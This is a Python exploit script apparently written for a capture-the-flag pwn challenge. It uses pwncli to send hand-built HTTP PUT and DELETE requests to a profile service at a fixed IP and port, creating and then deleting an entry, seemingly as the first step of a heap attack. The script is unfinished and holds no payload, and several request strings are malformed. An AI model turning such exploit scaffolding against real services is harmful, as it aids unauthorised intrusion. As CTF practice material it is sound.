#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('./libc-2.31.so')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

METHOD = "POST"
id = 2
name = "hello"
passwd = "hhhhh"
data = f"""PUT /profile?id=2&name=12334&password=nihao&password_length=10 HTTP/1.1\r
Host: 175.20.22.30:9999\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r
Accept-Encoding: gzip, deflate\r
DNT: 1\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r
Pragma: no-cache\r
Cache-Control: no-cache\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 49
Origin: http://175.20.22.30:9999\r
\r
id=2&name=12334&password=nihao&password_length=10\r
\r
"""

def create(id, name, password, password_length):
    data = b"""PUT /profile?id=""" + i2b(id) + b"""&name=""" + name +b"""&password=""" + password + b"""&password_length=""" + i2b(password_length) + b"""HTTP/1.1\r
Host: 175.20.22.30:9999\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r
Accept-Encoding: gzip, deflate\r
DNT: 1\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r
Pragma: no-cache\r
Cache-Control: no-cache\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 49
Origin: http://175.20.22.30:9999\r
\r
""" + b"""/profile?id=""" + i2b(id) + b"""&name=""" + name +b"""&password=""" + password + b"""&password_length=""" + i2b(password_length) + b"""\r
\r
"""
    s(data)

def delet(id):
    data = b"""DELETE /profile?id=""" + i2b(id) + b"""HTTP/1.1\r
Host: 175.20.22.30:9999\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r
Accept-Encoding: gzip, deflate\r
DNT: 1\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r
Pragma: no-cache\r
Cache-Control: no-cache\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 49
Origin: http://175.20.22.30:9999\r
\r
""" + b"""/profile?id=""" + i2b(id) + b"""\r
\r
"""
    s(data)

create(1, b"abcd", b"a", 10)
delet(1)

ia()
